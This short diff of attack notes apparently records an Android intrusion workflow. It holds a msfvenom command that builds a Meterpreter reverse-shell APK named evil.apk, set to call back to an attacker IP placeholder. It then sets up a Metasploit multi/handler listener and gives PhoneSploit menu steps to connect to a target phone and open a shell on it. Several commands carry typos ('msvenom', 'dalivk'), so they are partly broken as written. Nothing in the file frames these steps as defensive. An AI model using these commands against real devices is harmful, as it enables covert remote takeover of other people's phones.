@@ -1,1 +1,17 @@
 
+msf> 
+msvenom -p android/meterpreter/reverse_tcp --platform android -a dalivk LHOST=<ATTAKER_IP> R > evil.apk
+
+use exploit/multi/handler
+exploit -j -z
+
+
+phonesploit
+(main menu) >3
+(connect phone) > target IP
+(main menu) >4
+(shell on phone) > target ip
+
+pwd
+ls
+
